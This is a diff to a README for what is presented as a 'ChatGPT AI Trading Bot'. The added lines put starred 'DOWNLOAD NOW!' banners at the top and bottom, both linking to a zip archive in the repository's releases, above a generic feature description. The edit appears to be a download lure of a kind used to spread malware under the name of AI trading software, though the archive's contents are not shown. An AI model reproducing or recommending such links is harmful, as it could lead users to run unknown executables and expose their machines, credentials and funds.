@@ -1,5 +1,7 @@
-![ChatGPT AI Trading Bot](https://github.com/user-attachments/assets/b24ffb76-a717-4746-b7cc-aff3aaf1802b)
-
+![ChatGPT AI Trading Bot](https://github.com/user-attachments/assets/d689f36c-4a9f-4826-ae72-e705ffdc342d)
+*************************************************************
+[DOWNLOAD NOW!](https://github.com/IslaGray/ChatGPT-AI-Trading-Bot/releases/download/Download/ChatGPT-AI-TrBot.zip)
+*************************************************************
 Program Name: ChatGPT AI Trading Bot
 Purpose: Automating financial market analysis and trading decisions using AI powered by ChatGPT.
 1. General Description
@@ -50,3 +52,6 @@ ChatGPT AI Trading Bot is software designed for automatic or semi-automatic trad
     Investors who want to enhance their market performance through AI-driven insights.
 
 Note: The program does not guarantee profits and does not serve as financial advice.
+*************************************************************
+[DOWNLOAD NOW!](https://github.com/IslaGray/ChatGPT-AI-Trading-Bot/releases/download/Download/ChatGPT-AI-TrBot.zip)
+*************************************************************
